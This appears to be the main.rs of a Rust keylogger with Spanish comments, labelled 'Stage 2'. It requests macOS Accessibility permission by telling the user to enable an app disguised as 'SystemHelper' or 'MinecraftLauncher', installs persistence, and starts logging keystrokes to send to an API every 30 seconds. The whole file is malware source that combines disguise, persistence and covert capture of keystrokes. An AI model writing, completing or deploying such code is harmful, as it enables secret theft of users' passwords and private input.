// main.rs
mod keylogger;
mod api;
mod persistence;
mod crypto;

use api::ApiClient;
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;

// === Módulo para permisos de Accesibilidad en macOS ===
#[cfg(target_os = "macos")]
mod macos_permission {
    // Enlazar con el framework ApplicationServices de macOS
    #[link(name = "ApplicationServices", kind = "framework")]
    extern "C" {
        fn AXIsProcessTrusted() -> u8; // Devuelve 1 si tiene permiso, 0 si no
    }

    pub fn is_trusted() -> bool {
        unsafe { AXIsProcessTrusted() != 0 }
    }

    pub fn open_accessibility_preferences() {
        let _ = std::process::Command::new("open")
            .args(&["x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility"])
            .spawn();
    }
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔐 Stage 2 - Keylogger iniciado");

    // === SOLICITAR PERMISOS DE ACCESIBILIDAD (macOS) ===
    #[cfg(target_os = "macos")]
    {
        // Verificar si ya tiene permisos
        let trusted = macos_permission::is_trusted();
        println!("📌 Estado actual de Accesibilidad: {}", if trusted { "✅ Concedido" } else { "❌ No concedido" });

        if !trusted {
            println!("🔐 Esta aplicación necesita permisos de Accesibilidad.");
            println!("📌 Se abrirá Preferencias del Sistema para que los actives.");
            println!("👉 Activa 'SystemHelper' o 'MinecraftLauncher' en Accesibilidad.");
            println!("⚠️  Después de activarlo, la aplicación continuará automáticamente.");

            macos_permission::open_accessibility_preferences();

            let mut espera = 0;
            while !macos_permission::is_trusted() {
                espera += 1;
                println!("⏳ Esperando permiso de Accesibilidad... ({:02}s)", espera * 3);
                sleep(Duration::from_secs(3));
            }
            println!("✅ Permiso de Accesibilidad concedido. Continuando...");
        } else {
            println!("✅ Permiso de Accesibilidad ya concedido.");
        }
    }

    // 1. INSTALAR PERSISTENCIA
    println!("📌 Llamando a persistence::install()...");
    match persistence::install() {
        Ok(_) => println!("✅ persistence::install() completado correctamente"),
        Err(e) => println!("❌ persistence::install() falló: {}", e),
    }

    // 2. Iniciar keylogger
    let api_client = Arc::new(ApiClient::new("http://localhost:8080"));
    println!("⌨️  Keylogger activo - presiona teclas");
    println!("📤 Las teclas se enviarán a la API cada {} segundos.", 30);

    // Ejecutar el keylogger y capturar errores para mostrarlos
    if let Err(e) = keylogger::start(api_client) {
        eprintln!("❌ Error en el keylogger: {}", e);
        return Err(e);
    }

    Ok(())
}
